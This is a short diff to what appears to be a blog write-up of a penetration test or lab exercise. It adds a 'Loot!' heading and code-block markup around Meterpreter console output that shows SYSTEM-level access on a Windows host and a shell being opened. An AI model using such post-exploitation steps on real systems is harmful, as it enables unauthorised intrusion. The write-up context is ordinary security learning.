@@ -170,6 +170,12 @@ Logged On Users : 0
 Meterpreter     : x64/windows
 meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+{% endhighlight %}
+
+## Loot!
+
+{% highlight bash %}
 meterpreter > shell
 Process 2828 created.
 Channel 1 created.
